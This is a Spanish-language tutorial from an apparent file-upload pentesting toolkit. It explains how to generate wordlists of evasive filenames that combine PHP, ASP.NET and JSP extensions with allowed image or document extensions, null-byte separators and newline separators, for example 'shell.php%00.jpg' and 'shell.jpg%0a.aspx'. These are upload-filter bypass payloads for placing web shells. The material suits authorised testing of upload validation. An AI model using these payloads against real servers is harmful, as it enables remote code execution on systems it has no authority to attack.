# 04 - Stack desconocido: PHP + ASP.NET + JSP

## Objetivo

Generar una wordlist de **filenames evasivos multi-stack** cuando no tienes claro qué tecnología interpreta archivos en el servidor.

Este ejemplo no intenta detectar el stack. Solo prepara una lista de nombres que cubre handlers frecuentes en:

```text
PHP       → .php, .phtml, .phar, .php5...
ASP.NET   → .aspx, .ashx, .asmx, .config...
Java/JSP  → .jsp, .jspx, .war...
```

La idea es componer:

```text
extensiones server-side × extensiones permitidas × separadores × patrones de filename
```

## Cuándo usarlo

Úsalo cuando:

```text
[ ] El banner/headers no dejan claro el stack.
[ ] Hay proxy/CDN o framework que oculta tecnología.
[ ] El formulario es genérico: "upload file", "attachment", "screenshot".
[ ] Quieres una lista amplia, pero todavía controlada.
[ ] No quieres meter todas las extensiones de SecLists.
```

No lo uses como primera opción si ya sabes que la app es PHP. En ese caso es más limpio usar `01-php-jpg-only.md` o `02-php-images-default.md`.

---

## Inputs

| Entrada | Ruta | Motivo |
|---|---|---|
| PHP | `wordlists/custom/php_exts.txt` | Handlers PHP comunes y alternativos |
| ASP.NET/IIS | `wordlists/custom/asp_exts.txt` | Handlers y ficheros relevantes en IIS |
| JSP/Java | `wordlists/custom/jsp_exts.txt` | JSP/JSPX/WAR |
| Extensiones permitidas | `wordlists/custom/allowed_image_exts.txt` | `.jpg`, `.jpeg`, `.png`, `.gif` por defecto |
| Salida intermedia | `wordlists/generated/server_side_exts.txt` | Lista limpia combinada |
| Salida final | `wordlists/generated/server_side_image_evasive.txt` | Filenames evasivos generados |

---

## Paso 1 - Crear lista combinada de extensiones server-side

```bash
cd /opt/fileUpload

cat \
  wordlists/custom/php_exts.txt \
  wordlists/custom/asp_exts.txt \
  wordlists/custom/jsp_exts.txt \
  | tr -d '\r' \
  | sed 's/#.*$//' \
  | sed 's/^[[:space:]]*//; s/[[:space:]]*$//' \
  | sed '/^$/d' \
  | sed 's/^\([^.].*\)$/\.\1/' \
  | sort -u \
  > wordlists/generated/server_side_exts.txt
```

## Paso 2 - Revisar la lista antes de generar

```bash
wc -l wordlists/generated/server_side_exts.txt
cat wordlists/generated/server_side_exts.txt
```

Ejemplo de contenido esperado:

```text
.php
.php3
.php4
.php5
.php7
.phtml
.phar
.asp
.aspx
.ashx
.asmx
.config
.jsp
.jspx
.war
```

Si la lista es demasiado amplia, crea una versión reducida:

```bash
cat > wordlists/generated/server_side_exts_small.txt <<'EOF_EXTS'
.php
.phtml
.phar
.aspx
.ashx
.jsp
.jspx
EOF_EXTS
```

---

## Paso 3 - Generar filenames evasivos contra imágenes

```bash
bin/gen_filename_wordlist.sh \
  wordlists/generated/server_side_exts.txt \
  wordlists/generated/server_side_image_evasive.txt \
  wordlists/custom/allowed_image_exts.txt
```

Salida:

```text
wordlists/generated/server_side_image_evasive.txt
```

Comprobaciones rápidas:

```bash
wc -l wordlists/generated/server_side_image_evasive.txt
head -30 wordlists/generated/server_side_image_evasive.txt
```

Buscar por stack:

```bash
grep -E '\.phtml|\.phar|\.php' wordlists/generated/server_side_image_evasive.txt | head
grep -E '\.aspx|\.ashx|\.config' wordlists/generated/server_side_image_evasive.txt | head
grep -E '\.jsp|\.jspx|\.war' wordlists/generated/server_side_image_evasive.txt | head
```

---

## Ejemplos de salida por stack

### PHP

```text
shell.php.jpg
shell.jpg.php
shell.phtml.png
shell.gif.phar
shell.php%00.jpg
shell.jpg%0a.phtml
shell.phar%20.jpeg
```

### ASP.NET / IIS

```text
shell.aspx.jpg
shell.jpg.aspx
shell.ashx.png
shell.png.ashx
shell.config.jpg
shell.jpg.config
shell.asp%00.jpg
shell.jpg%20.aspx
```

### Java / JSP

```text
shell.jsp.jpg
shell.jpg.jsp
shell.jspx.png
shell.png.jspx
shell.war.jpg
shell.jpg.war
shell.jsp%0a.jpg
shell.gif%00.jspx
```

---

## Cómo interpretar la salida

| Familia | Qué intenta cubrir |
|---|---|
| `shell.aspx.jpg` | Handler server-side antes de extensión permitida |
| `shell.jpg.aspx` | Extensión permitida antes del handler |
| `shell.jsp%00.jpg` | Separador/control char antes de allowlist |
| `shell.jpg%0a.jsp` | Separador/control char entre allowlist y handler |
| `shell.config.png` | Archivos especiales de configuración en IIS |
| `shell.war.jpg` | Java archive camuflado como imagen |

La salida no asume que todos los handlers sean ejecutables. Solo prepara candidatos para pruebas posteriores.

---

## Variante A - Multi-stack contra `.jpg` únicamente

Útil si la app solo deja pasar `.jpg`.

```bash
printf '.jpg\n' > wordlists/generated/allowed_jpg_only.txt

bin/gen_filename_wordlist.sh \
  wordlists/generated/server_side_exts.txt \
  wordlists/generated/server_side_jpg_only.txt \
  wordlists/generated/allowed_jpg_only.txt
```

Salida:

```text
wordlists/generated/server_side_jpg_only.txt
```

---

## Variante B - Multi-stack contra documentos permitidos

Útil si la app permite adjuntos tipo PDF/Office/ZIP:

```bash
cat > wordlists/generated/allowed_documents.txt <<'EOF_ALLOWED'
.pdf
.docx
.xlsx
.zip
EOF_ALLOWED

bin/gen_filename_wordlist.sh \
  wordlists/generated/server_side_exts.txt \
  wordlists/generated/server_side_docs_evasive.txt \
  wordlists/generated/allowed_documents.txt
```

Ejemplos de salida:

```text
shell.php.pdf
shell.pdf.php
shell.aspx.docx
shell.docx.aspx
shell.jsp.zip
shell.zip.jsp
```

---

## Variante C - Separar por stack

Si quieres resultados más fáciles de analizar, genera un fichero por tecnología:

```bash
bin/gen_filename_wordlist.sh \
  wordlists/custom/php_exts.txt \
  wordlists/generated/php_images_evasive.txt \
  wordlists/custom/allowed_image_exts.txt

bin/gen_filename_wordlist.sh \
  wordlists/custom/asp_exts.txt \
  wordlists/generated/aspnet_images_evasive.txt \
  wordlists/custom/allowed_image_exts.txt

bin/gen_filename_wordlist.sh \
  wordlists/custom/jsp_exts.txt \
  wordlists/generated/jsp_images_evasive.txt \
  wordlists/custom/allowed_image_exts.txt
```

Ventaja:

```text
Si un grupo de resultados funciona, sabes qué familia tecnológica merece más atención.
```

---

## Qué guardar en Git

Normalmente versiona:

```text
wordlists/custom/php_exts.txt
wordlists/custom/asp_exts.txt
wordlists/custom/jsp_exts.txt
examples/04-server-side-multistack.md
```

No hace falta versionar:

```text
wordlists/generated/server_side_exts.txt
wordlists/generated/server_side_image_evasive.txt
```

porque se regeneran.
